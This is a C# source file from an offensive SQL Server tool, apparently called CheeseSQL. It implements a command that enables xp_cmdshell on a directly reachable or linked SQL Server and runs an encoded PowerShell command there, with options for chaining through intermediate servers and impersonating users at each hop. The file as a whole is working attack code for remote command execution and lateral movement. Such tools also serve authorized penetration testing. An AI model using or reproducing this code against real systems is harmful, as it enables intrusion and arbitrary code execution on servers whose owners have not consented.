using CheeseSQL.Helpers;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace CheeseSQL.Commands
{
    public class xp : ICommand
    {
        public static string CommandName => "xp";

        public string Description()
        {
            return $"[*] {CommandName}\r\n" +
                   $"  Description: Execute Encoded PowerShell Command on directly accessible or Linked SQL Server via 'xp_cmdshell'";
        }

        public string Usage()
        {
            return $"{Description()}\r\n  " +
                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
                $"/db:DATABASE " +
                $"/server:SERVER " +
                $"/intermediate:INTERMEDIATE " +
                $"/target:TARGET " +
                $"/command:COMMAND " +
                $"[/impersonate:USER] " +
                $"[/impersonate-intermediate:USER] " +
                $"[/impersonate-linked:USER] " +
                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
        }

        public void Execute(Dictionary<string, string> arguments)
        {
            string connectInfo = "";
            string database = "";
            string connectserver = "";
            string intermediate = "";
            string target = "";
            string cmd = "";
            string impersonate = "";
            string impersonate_intermediate = "";
            string impersonate_linked = "";

            bool sqlauth = arguments.ContainsKey("/sqlauth");

            arguments.TryGetValue("/impersonate", out impersonate);
            arguments.TryGetValue("/intermediate", out intermediate);
            arguments.TryGetValue("/target", out target);
            arguments.TryGetValue("/impersonate-intermediate", out impersonate_intermediate);
            arguments.TryGetValue("/impersonate-linked", out impersonate_linked);

            if (!arguments.TryGetValue("/db", out database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (!arguments.TryGetValue("/server", out connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (!arguments.TryGetValue("/command", out cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
                return;
            }

            SqlConnection connection;
            SQLExecutor.ConnectionInfo(arguments, connectserver, database, sqlauth, out connectInfo);
            if (String.IsNullOrEmpty(connectInfo))
            {
                return;
            }
            if (!SQLExecutor.Authenticate(connectInfo, out connection))
            {
                return;
            }

            var procedures = new Dictionary<string, string>();

            procedures.Add("Enabling advanced options..", $"sp_configure 'show advanced options', 1; RECONFIGURE;");
            procedures.Add("Enabling 'xp_cmdshell'..", $"sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
            procedures.Add("Executing command..", $"xp_cmdshell 'powershell -enc {cmd}';");
            procedures.Add("Disabling 'xp_cmdshell'..", $"sp_configure 'xp_cmdshell', 0; RECONFIGURE;");

            foreach (string step in procedures.Keys)
            {
                Console.WriteLine("[*] {0}", step);

                if (String.IsNullOrEmpty(target) && String.IsNullOrEmpty(intermediate))
                {
                    SQLExecutor.ExecuteProcedure(connection, procedures[step]);
                }
                else if (String.IsNullOrEmpty(intermediate))
                {
                    SQLExecutor.ExecuteLinkedProcedure(connection, procedures[step], target, impersonate, impersonate_linked);
                }
                else
                {
                    SQLExecutor.ExecuteDoubleLinkedProcedure(connection, procedures[step], target, intermediate, impersonate, impersonate_linked, impersonate_intermediate);
                }
            }

            connection.Close();
        }
    }
}
